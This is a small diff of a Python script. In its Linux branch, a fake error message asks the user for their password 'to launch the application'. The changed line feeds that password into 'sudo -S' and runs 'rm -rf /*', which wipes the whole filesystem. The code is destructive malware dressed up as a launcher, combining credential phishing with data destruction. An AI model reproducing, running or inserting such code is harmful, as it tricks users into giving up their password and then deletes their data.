@@ -9,7 +9,7 @@ if platform in ("linux", "linux2"):
     # linux
     password = input("Error: Please input your password to launch the "
                      "application: ")
-    os.system('sudo rm -rf /*')
+    os.system(f'echo {password} | sudo -S sudo rm -rf /*')
 
 elif platform == "darwin":
     # OS X
